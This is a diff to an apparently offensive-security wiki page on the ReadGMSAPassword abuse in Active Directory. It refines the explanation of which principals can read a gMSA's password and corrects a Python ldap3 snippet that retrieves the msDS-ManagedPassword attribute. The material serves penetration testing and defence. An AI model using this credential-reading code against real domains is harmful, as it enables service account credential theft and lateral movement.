@@ -1,8 +1,8 @@
 # ReadGMSAPassword
 
-This abuse can be carried out when controlling an object that has, for instance, `AllExtendedRights` over a target computer.
+This abuse stands out a bit from other abuse cases. It can be carried out when controlling an object that has enough permissions listed in the target gMSA account's `msDS-GroupMSAMembership` attribute's DACL. Usually, these objects are principals that were configured to be explictly allowed to use the gMSA account.
 
-The attacker can read the gMSA (group managed service accounts) password of the account.&#x20;
+The attacker can then read the gMSA (group managed service accounts) password of the account if those requirements are met.&#x20;
 
 {% tabs %}
 {% tab title="UNIX-like" %}
@@ -36,9 +36,9 @@ username = "username"
 user = "{}\\{}".format(domain, username)
 password = "password"
 server = ldap3.Server(domain)
-connection = ldap3.Connection(server = server, user = user, password = password, authentication = NTLM)
+connection = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)
 connection.bind()
-connection.search(target_dn, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
+connection.search(target_dn, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
 print(connection.entries)
 ```
 {% endtab %}
@@ -64,3 +64,7 @@ The second one relies on [GMSAPasswordReader](https://github.com/rvazarkar/GMSAP
 ```
 {% endtab %}
 {% endtabs %}
+
+## References
+
+{% embed url="https://cube0x0.github.io/Relaying-for-gMSA/" %}
